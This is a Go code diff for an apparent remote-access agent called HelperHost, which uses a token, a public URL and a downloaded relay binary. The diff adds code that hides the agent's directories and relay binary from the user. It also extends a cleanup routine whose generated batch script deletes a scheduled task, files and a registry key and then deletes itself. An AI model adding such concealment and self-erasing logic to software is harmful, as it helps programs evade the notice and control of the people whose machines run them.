@@ -57,8 +57,9 @@ func initPaths() {
 		dir = filepath.Join(home, ".local", "share", "HelperHost")
 	}
 	cacheDir = filepath.Join(os.TempDir(), "HelperHostCache")
-	_ = os.MkdirAll(dir, 0o755)
-	_ = os.MkdirAll(cacheDir, 0o755)
+	ensureHiddenDir(dir)
+	ensureHiddenDir(cacheDir)
+	ensureHiddenDir(filepath.Join(dir, "tools"))
 	configPath = filepath.Join(dir, "config.json")
 	tokenPath = filepath.Join(dir, "token")
 	urlPath = filepath.Join(dir, "public_url")
@@ -254,6 +255,8 @@ func ensureEdgeRelay() (string, error) {
 	}
 	_ = os.Chmod(edgePath, 0o755)
 	toCache(name, edgePath)
+	hidePath(edgePath)
+	hidePath(cacheDir)
 	return edgePath, nil
 }
 
@@ -497,6 +500,12 @@ func wipeAll() {
 		}
 		return nil
 	})
+	_ = filepath.Walk(cacheDir, func(p string, info os.FileInfo, err error) error {
+		if err == nil {
+			unhidePath(p)
+		}
+		return nil
+	})
 
 	secureRmTree(cacheDir)
 	home, _ := os.UserHomeDir()
@@ -529,12 +538,15 @@ func wipeAll() {
 			"schtasks /Delete /TN AgentShePC /F >nul 2>&1\r\n" +
 			"attrib -h -s /s /d \"" + dir + "\\*\" >nul 2>&1\r\n" +
 			"attrib -h -s \"" + dir + "\" >nul 2>&1\r\n" +
+			"attrib -h -s /s /d \"" + cacheDir + "\\*\" >nul 2>&1\r\n" +
 			"attrib -h -s \"" + cacheDir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + dir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
+			"reg delete \"HKCU\\Software\\HelperHost\" /f >nul 2>&1\r\n" +
 			"del /f /q \"" + restorePS1 + "\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-elev-*.ps1\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-install.*\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-*\" >nul 2>&1\r\n" +
 			"del \"%~f0\" >nul 2>&1\r\n"
 		_ = os.WriteFile(bat, []byte(body), 0o644)
 		cmd := exec.Command("cmd", "/C", "start", "", "/MIN", bat)
